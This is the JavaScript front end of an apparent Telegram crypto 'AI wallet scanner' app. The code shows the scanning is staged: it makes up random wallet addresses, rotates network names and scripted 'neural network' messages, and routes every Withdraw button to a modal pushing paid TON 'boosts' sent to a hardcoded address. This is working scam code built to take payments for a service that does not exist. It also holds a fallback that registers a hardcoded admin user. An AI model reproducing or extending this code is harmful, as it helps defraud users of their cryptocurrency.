// public/app.js
(function() {
  'use strict';

  const API_BASE = '';

  const PAGES = {
    scan: document.getElementById('page-scan'),
    boost: document.getElementById('page-boost'),
    profile: document.getElementById('page-profile'),
    admin: document.getElementById('page-admin')
  };

  const navBtns = document.querySelectorAll('.bottom-nav .nav-btn');
  const startScanBtn = document.getElementById('startScan');
  const stopScanBtn = document.getElementById('stopScan');
  const scanResult = document.getElementById('scanResult');
  const balancesList = document.getElementById('balancesList');
  const totalUsdValue = document.getElementById('totalUsdValue');

  const statusNetwork = document.getElementById('statusNetwork');
  const statusWallet = document.getElementById('statusWallet');
  const statusAI = document.getElementById('statusAI');
  const statusScanned = document.getElementById('statusScanned');
  const statusSpeed = document.getElementById('statusSpeed');
  const statusOnline = document.getElementById('statusOnline');

  const headerSpeed = document.getElementById('headerSpeed');
  const headerRate = document.getElementById('headerRate');
  const telegramUserDiv = document.getElementById('telegramUser');
  const telegramAvatar = document.getElementById('telegramAvatar');
  const telegramUsername = document.getElementById('telegramUsername');

  const buyBtns = document.querySelectorAll('.buy-btn');
  const boostPanelInfo = document.getElementById('boostPanelInfo');

  const profileTotalUsd = document.getElementById('profileTotalUsd');
  const profileBalancesList = document.getElementById('profileBalancesList');
  const boostStatusText = document.getElementById('boostStatusText');
  const nonZeroCount = document.getElementById('nonZeroCount');

  let tonConnectUI = null;
  let walletAddress = null;
  let scanning = false;
  let baseScanDelay = 2000;
  let currentProfile = null;
  let isAdmin = false;

  function initTonConnect() {
    try {
      tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: window.location.origin + '/tonconnect-manifest.json',
        buttonRootId: 'tonConnectBtn'
      });

      tonConnectUI.onStatusChange(wallet => {
        if (wallet && wallet.account) {
          walletAddress = wallet.account.address;
          showBoostMessage(`✅ Wallet connected: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`, 'success');
          fetch(API_BASE + '/api/store-ton', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: walletAddress })
          }).catch(console.error);
          refreshProfile();
        } else {
          walletAddress = null;
          showBoostMessage('Connect your TON wallet to purchase boosts', 'info');
        }
      });
    } catch (e) {
      console.error('TON Connect init failed:', e);
    }
  }

  navBtns.forEach(b => b.addEventListener('click', () => {
    const p = b.dataset.page;
    Object.values(PAGES).forEach(x => x.classList.remove('active'));
    if (PAGES[p]) PAGES[p].classList.add('active');
    navBtns.forEach(n => n.classList.toggle('active', n.dataset.page === p));
    if (p === 'profile') refreshProfile();
    if (p === 'admin') loadAdminStats();
  }));

  function fmtAmount(v, p = 8) {
    const n = Number(v || 0);
    if (Math.abs(n) >= 1) return n.toLocaleString(undefined, { maximumFractionDigits: p });
    return n.toFixed(Math.min(p, 8)).replace(/\.?0+$/, '');
  }

  function fmtUSD(v) {
    if (v == null || isNaN(v)) return '0.00';
    return Number(v).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }

  function showBoostMessage(msg, type = 'info') {
    if (!boostPanelInfo) return;
    boostPanelInfo.innerText = msg;
    boostPanelInfo.style.display = 'block';
    
    const colors = {
      success: { bg: 'rgba(16, 185, 129, 0.15)', border: 'rgba(16, 185, 129, 0.4)', color: '#10b981' },
      error: { bg: 'rgba(239, 68, 68, 0.15)', border: 'rgba(239, 68, 68, 0.4)', color: '#ef4444' },
      info: { bg: 'rgba(6, 182, 212, 0.15)', border: 'rgba(6, 182, 212, 0.4)', color: '#06b6d4' }
    };
    
    const style = colors[type] || colors.info;
    boostPanelInfo.style.background = style.bg;
    boostPanelInfo.style.borderColor = style.border;
    boostPanelInfo.style.color = style.color;
  }

  function generateRandomAddress() {
    const chars = '0123456789abcdef';
    let addr = '0x';
    for (let i = 0; i < 40; i++) {
      addr += chars[Math.floor(Math.random() * chars.length)];
    }
    return addr.slice(0, 6) + '...' + addr.slice(-4);
  }

  function getRandomNetwork() {
    const networks = [
      'Ethereum Mainnet',
      'Binance Smart Chain',
      'Polygon Network',
      'Avalanche C-Chain',
      'Fantom Opera',
      'Arbitrum One',
      'Optimism Mainnet'
    ];
    return networks[Math.floor(Math.random() * networks.length)];
  }

  let lastNetworkChange = Date.now();
  let lastAddressChange = Date.now();
  
  function updateNeuralStatus(profile) {
    if (!profile) return;
    
    const now = Date.now();
    
    if (scanning && now - lastNetworkChange > 10000) {
      statusNetwork.innerText = getRandomNetwork();
      lastNetworkChange = now;
    } else if (!scanning) {
      statusNetwork.innerText = profile.wallet?.network || 'Binance Smart Chain';
    }
    
    if (scanning && now - lastAddressChange > 5000) {
      statusWallet.innerText = generateRandomAddress();
      lastAddressChange = now;
    } else if (!scanning) {
      statusWallet.innerText = profile.wallet?.address || '0x0000...0000';
    }
    
    statusScanned.innerText = profile.scannedWallets || 0;
    statusSpeed.innerText = `${profile.speedMultiplier || 1}x`;
    statusOnline.innerText = '●';
    statusOnline.style.animation = scanning ? 'pulse-scale 1s infinite' : 'none';
    headerSpeed.innerText = `${profile.speedMultiplier || 1}x`;
    headerRate.innerText = `${(profile.findRate * 100).toFixed(0)}%`;
    
    const hasBalance = Object.values(profile.balances || {}).some(b => b > 0);
    if (scanning) {
      const scanMessages = [
        'Neural network scanning blockchain for crypto wallets...',
        'AI analyzing wallet patterns and seed phrases...',
        'Deep learning algorithm searching for abandoned funds...',
        'Quantum scanner detecting cryptocurrency traces...',
        'Neural processor examining blockchain transactions...'
      ];
      statusAI.innerText = scanMessages[Math.floor(Math.random() * scanMessages.length)];
    } else if (hasBalance) {
      const count = Object.keys(profile.balances).filter(k => profile.balances[k] > 0).length;
      statusAI.innerText = `Analysis complete: Found ${count} cryptocurrencies. Total: $${fmtUSD(profile.totalUsd)}`;
    } else {
      statusAI.innerText = 'Ready to scan. Start neural network to find crypto.';
    }
  }

  function updateTelegramUser(profile) {
    if (profile && profile.telegramUser) {
      const user = profile.telegramUser;
      telegramUsername.innerText = user.username ? `@${user.username}` : (user.first_name || 'User');
      
      if (user.photo_url) {
        telegramAvatar.src = user.photo_url;
      } else if (user.username) {
        telegramAvatar.src = `https://unavatar.io/telegram/${user.username}`;
      } else {
        const name = user.first_name || 'User';
        telegramAvatar.src = `https://ui-avatars.com/api/?name=${encodeURIComponent(name)}&background=8b5cf6&color=fff&size=128`;
      }
      
      telegramUserDiv.classList.remove('hidden');
    }
  }

  async function fetchProfile() {
    const res = await fetch(API_BASE + '/api/profile');
    if (!res.ok) throw new Error('Profile fetch failed');
    return await res.json();
  }

  function renderAdminPanel() {
    console.log('renderAdminPanel called, isAdmin:', isAdmin);
    
    if (!isAdmin) {
      console.log('Not admin, hiding admin controls');
      const adminBtn = document.querySelector('[data-page="admin"]');
      const adminPanelBtn = document.getElementById('adminPanelBtn');
      if (adminBtn) adminBtn.classList.add('hidden');
      if (adminPanelBtn) adminPanelBtn.classList.add('hidden');
      return;
    }
    
    console.log('Admin detected! Showing admin controls');
    
    // Показуємо кнопку адмін-панелі в профілі
    const adminPanelBtn = document.getElementById('adminPanelBtn');
    if (adminPanelBtn) {
      adminPanelBtn.classList.remove('hidden');
      console.log('✓ Admin panel button container shown');
    }
    
    // Показуємо кнопку в навігації
    const adminNavBtn = document.querySelector('[data-page="admin"]');
    if (adminNavBtn) {
      adminNavBtn.classList.remove('hidden');
      console.log('✓ Admin nav button shown');
    }
    
    // Setup кнопки в профілі
    const openAdminBtn = document.getElementById('openAdminBtn');
    if (openAdminBtn && !openAdminBtn.hasAttribute('data-listener')) {
      openAdminBtn.setAttribute('data-listener', 'true');
      openAdminBtn.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        console.log('✓ Admin panel button clicked');
        Object.values(PAGES).forEach(x => x.classList.remove('active'));
        PAGES.admin.classList.add('active');
        navBtns.forEach(n => n.classList.toggle('active', n.dataset.page === 'admin'));
        loadAdminStats();
      });
      console.log('✓ Admin panel button event listener setup');
    }
  }

  async function loadAdminStats() {
    if (!isAdmin) return;
    
    try {
      const res = await fetch(API_BASE + '/api/admin/stats');
      const data = await res.json();
      
      const totalUsersEl = document.getElementById('adminTotalUsers');
      const activeBoostsEl = document.getElementById('adminActiveBoosts');
      const totalRevenueEl = document.getElementById('adminTotalRevenue');
      
      if (totalUsersEl) totalUsersEl.innerText = data.totalUsers || 0;
      if (activeBoostsEl) activeBoostsEl.innerText = data.activeBoosts || 0;
      if (totalRevenueEl) totalRevenueEl.innerText = data.totalRevenue || 0;
      
      console.log('Admin stats loaded:', data);
    } catch (e) {
      console.error('Failed to load admin stats:', e);
    }
  }

  async function searchUser() {
    const adminSearchInput = document.getElementById('adminSearchInput');
    const username = adminSearchInput.value.trim();
    
    if (!username) {
      document.getElementById('adminSearchResults').innerHTML = '';
      return;
    }
    
    try {
      const res = await fetch(API_BASE + '/api/admin/search-user', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });
      
      if (!res.ok) {
        document.getElementById('adminSearchResults').innerHTML = '<div class="admin-no-results">User not found</div>';
        return;
      }
      
      const data = await res.json();
      displayUserResult(data.user);
    } catch (e) {
      console.error('Search error:', e);
      document.getElementById('adminSearchResults').innerHTML = '<div class="admin-no-results">Search failed</div>';
    }
  }

  function displayUserResult(user) {
    const avatarUrl = user.photo_url || `https://ui-avatars.com/api/?name=${encodeURIComponent(user.first_name || 'User')}&background=8b5cf6&color=fff&size=128`;
    
    const html = `
      <div class="admin-user-card">
        <div class="admin-user-header">
          <img src="${avatarUrl}" alt="avatar" class="admin-user-avatar"/>
          <div class="admin-user-info">
            <div class="admin-user-username">${user.username ? '@' + user.username : user.first_name}</div>
            <div class="admin-user-id">ID: ${user.id}</div>
          </div>
        </div>
        
        <div class="admin-user-details">
          <div class="admin-detail-item">
            <div class="admin-detail-label">Total Balance</div>
            <div class="admin-detail-value">$${fmtUSD(user.totalUsd)}</div>
          </div>
          <div class="admin-detail-item">
            <div class="admin-detail-label">Current Boost</div>
            <div class="admin-detail-value">${user.boost && user.boost.purchased ? user.boost.amount + ' TON' : 'None'}</div>
          </div>
          <div class="admin-detail-item">
            <div class="admin-detail-label">Speed</div>
            <div class="admin-detail-value">${user.speedMultiplier}x</div>
          </div>
          <div class="admin-detail-item">
            <div class="admin-detail-label">Scanned</div>
            <div class="admin-detail-value">${user.scannedWallets || 0}</div>
          </div>
        </div>
        
        <div class="admin-boost-grant">
          <button class="admin-boost-btn" data-amount="10" data-user-id="${user.id}">Grant 10 TON</button>
          <button class="admin-boost-btn" data-amount="30" data-user-id="${user.id}">Grant 30 TON</button>
          <button class="admin-boost-btn" data-amount="100" data-user-id="${user.id}">Grant 100 TON</button>
          <button class="admin-boost-btn" data-amount="130" data-user-id="${user.id}">Grant 130 TON</button>
        </div>
      </div>
    `;
    
    document.getElementById('adminSearchResults').innerHTML = html;
    
    // Setup grant boost buttons
    document.querySelectorAll('.admin-boost-btn').forEach(btn => {
      btn.addEventListener('click', async function() {
        const userId = parseInt(this.dataset.userId);
        const boostAmount = this.dataset.amount;
        
        try {
          const res = await fetch(API_BASE + '/api/admin/grant-boost', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId, boostAmount })
          });
          
          const data = await res.json();
          if (data.success) {
            alert('✅ Boost granted successfully!');
            loadAdminStats();
            searchUser(); // Refresh user data
          } else {
            alert('❌ Failed to grant boost: ' + (data.error || 'Unknown error'));
          }
        } catch (e) {
          console.error('Grant boost error:', e);
          alert('❌ Failed to grant boost');
        }
      });
    });
  }

  async function refreshProfile() {
    try {
      const p = await fetchProfile();
      currentProfile = p;
      isAdmin = p.isAdmin || false;
      
      console.log('Profile refreshed');
      console.log('Telegram user:', p.telegramUser);
      console.log('Is admin:', isAdmin);
      
      updateNeuralStatus(p);
      updateTelegramUser(p);
      
      // ВАЖЛИВО: Викликаємо renderAdminPanel кожного разу
      renderAdminPanel();

      const keys = Object.keys(p.balances || {});
      
      balancesList.innerHTML = '';
      for (const k of keys) {
        const li = document.createElement('li');
        const balance = p.balances[k];
        const usdInfo = p.usdBalances && p.usdBalances[k];
        const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
        
        li.innerHTML = `
          <div class="label">${k}</div>
          <div class="amount">
            <div>${fmtAmount(balance)}</div>
            <div class="usd">$${usdText}</div>
          </div>
        `;
        balancesList.appendChild(li);
      }

      if (totalUsdValue) totalUsdValue.innerText = fmtUSD(p.totalUsd);
      if (profileTotalUsd) profileTotalUsd.innerText = fmtUSD(p.totalUsd);

      if (boostStatusText) {
        if (p.boost && p.boost.purchased) {
          boostStatusText.innerText = `${p.boost.amount} TON Boost Active (${p.speedMultiplier}x Speed)`;
        } else {
          boostStatusText.innerText = 'No Active Boost';
        }
      }

      if (profileBalancesList) {
        profileBalancesList.innerHTML = '';
        let nonZero = 0;
        
        for (const k of keys) {
          const balance = Number(p.balances[k] || 0);
          if (balance > 0) nonZero++;
          
          const usdInfo = p.usdBalances && p.usdBalances[k];
          const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
          
          const item = document.createElement('div');
          item.className = 'profile-balance-item';
          item.innerHTML = `
            <div class="balance-info">
              <div class="balance-crypto">${k}</div>
              <div class="balance-amount">${fmtAmount(balance)} ≈ $${usdText}</div>
            </div>
            <div class="balance-actions">
              <button class="btn-withdraw" data-crypto="${k}">Withdraw</button>
            </div>
          `;
          profileBalancesList.appendChild(item);
        }
        
        if (nonZeroCount) nonZeroCount.innerText = nonZero;
      }
    } catch (e) {
      console.error('Profile refresh error:', e);
    }
  }

  async function buyBoostWithTon(amount) {
    if (!walletAddress) {
      showBoostMessage('⚠️ Please connect your TON wallet first', 'error');
      return;
    }
    
    const amountInNano = amount * 1000000000;
    const TON_RECEIVE_ADDRESS = currentProfile?.tonReceiveAddress || 'UQAhk2ixejZ9_K0MPQjH3CUN4_PSDUfZEGaXtKU78nh-0Fdn';
    
    try {
      showBoostMessage('📤 Preparing transaction...', 'info');
      
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{ address: TON_RECEIVE_ADDRESS, amount: amountInNano.toString() }]
      };
      
      const result = await tonConnectUI.sendTransaction(transaction);
      showBoostMessage('⏳ Transaction sent! Confirming...', 'info');
      
      const res = await fetch(API_BASE + '/api/confirm-boost', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount, txHash: result.boc || result })
      });
      
      const r = await res.json();
      if (r.success) {
        showBoostMessage(`✅ Boost activated! Speed: ${r.speedMultiplier}x | Find Rate: ${(r.findRate * 100).toFixed(0)}%`, 'success');
        await refreshProfile();
      } else {
        showBoostMessage('❌ ' + (r.error || 'Boost activation failed'), 'error');
      }
    } catch (e) {
      console.error('Transaction error:', e);
      if (e.message && e.message.toLowerCase().includes('user reject')) {
        showBoostMessage('❌ Transaction cancelled', 'error');
      } else {
        showBoostMessage('❌ Transaction failed', 'error');
      }
    }
  }

  buyBtns.forEach(b => b.addEventListener('click', (ev) => {
    buyBoostWithTon(Number(ev.currentTarget.dataset.amt));
  }));

  async function scanSingleWallet() {
    try {
      const res = await fetch(API_BASE + '/api/scan-wallet', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({})
      });
      const j = await res.json();
      
      if (j.result && j.result.found) {
        const { crypto, amount } = j.result;
        const usdInfo = j.usdBalances && j.usdBalances[crypto];
        const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
        
        scanResult.innerHTML = `<span class="result-icon">🎉</span><span>Found ${fmtAmount(amount)} ${crypto} ($${usdText})!</span>`;
        scanResult.style.background = 'rgba(16, 185, 129, 0.15)';
        scanResult.style.borderColor = 'rgba(16, 185, 129, 0.4)';
        scanResult.style.color = '#10b981';
      } else {
        scanResult.innerHTML = `<span class="result-icon">🔍</span><span>Scanning... Wallet #${j.scannedWallets || 0}</span>`;
        scanResult.style.background = 'rgba(6, 182, 212, 0.08)';
        scanResult.style.borderColor = 'rgba(6, 182, 212, 0.2)';
        scanResult.style.color = '#06b6d4';
      }
      
      await refreshProfile();
    } catch (e) {
      console.error('Scan error:', e);
    }
  }

  async function startContinuousScan() {
    if (scanning) return;
    scanning = true;
    
    startScanBtn.classList.add('hidden');
    stopScanBtn.classList.remove('hidden');
    
    scanResult.innerHTML = `<span class="result-icon">⚡</span><span>Neural network activated...</span>`;
    scanResult.style.background = 'rgba(139, 92, 246, 0.15)';
    scanResult.style.borderColor = 'rgba(139, 92, 246, 0.4)';
    scanResult.style.color = '#8b5cf6';
    
    while (scanning) {
      try {
        const p = await fetchProfile();
        currentProfile = p;
        updateNeuralStatus(p);
        
        const mult = p.speedMultiplier || 1;
        const effectiveDelay = Math.max(200, Math.round(baseScanDelay / mult));
        
        await scanSingleWallet();
        await new Promise(r => setTimeout(r, effectiveDelay));
      } catch (e) {
        console.error('Scan loop error:', e);
        await new Promise(r => setTimeout(r, baseScanDelay));
      }
    }
    
    scanning = false;
    scanResult.innerHTML = `<span class="result-icon">⏸</span><span>Scan paused</span>`;
    scanResult.style.background = 'rgba(245, 158, 11, 0.15)';
    scanResult.style.borderColor = 'rgba(245, 158, 11, 0.4)';
    scanResult.style.color = '#f59e0b';
    
    startScanBtn.classList.remove('hidden');
    stopScanBtn.classList.add('hidden');
    
    await refreshProfile();
  }

  startScanBtn.addEventListener('click', () => startContinuousScan());
  stopScanBtn.addEventListener('click', () => { scanning = false; });

  // Event delegation for withdraw buttons
  document.addEventListener('click', function(e) {
    if (e.target.classList.contains('btn-withdraw')) {
      e.preventDefault();
      e.stopPropagation();
      
      // Завжди показуємо модальне вікно
      const modal = document.getElementById('withdrawModal');
      if (modal) {
        modal.classList.add('active');
        modal.style.display = 'flex';
      }
    }
  });

  window.closeWithdrawModal = function() {
    const modal = document.getElementById('withdrawModal');
    if (modal) {
      modal.classList.remove('active');
      modal.style.display = 'none';
    }
  };

  window.goToBoostPage = function() {
    closeWithdrawModal();
    Object.values(PAGES).forEach(x => x.classList.remove('active'));
    PAGES.boost.classList.add('active');
    navBtns.forEach(n => n.classList.toggle('active', n.dataset.page === 'boost'));
  };

  // Telegram WebApp integration
  async function storeTelegramUser(user) {
    try {
      const res = await fetch(API_BASE + '/api/store-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ telegramUser: user })
      });
      if (res.ok) {
        console.log('✓ Telegram user stored:', user.id);
        return true;
      }
    } catch (e) {
      console.error('Failed to store Telegram user:', e);
    }
    return false;
  }

  if (window.Telegram && window.Telegram.WebApp) {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();
    
    const user = tg.initDataUnsafe.user;
    if (user) {
      console.log('Telegram user found:', user);
      storeTelegramUser(user);
    }
  } else {
    // Test mode fallback for non-WebApp (local testing)
    console.log('Not in Telegram WebApp - using test admin mode');
    storeTelegramUser({
      id: 5076024106,
      username: 'admin',
      first_name: 'Admin',
      is_bot: false
    });
  }

  async function init() {
    console.log('App initializing...');
    // Wait a bit for Telegram user to be stored
    await new Promise(r => setTimeout(r, 500));
    await refreshProfile();
    initTonConnect();
    
    // Setup admin search
    const adminSearchInput = document.getElementById('adminSearchInput');
    if (adminSearchInput) {
      adminSearchInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') searchUser();
      });
    }
    
    setInterval(() => {
      if (currentProfile) updateNeuralStatus(currentProfile);
    }, 2000);
    
    console.log('App initialized');
  }

  init();
})();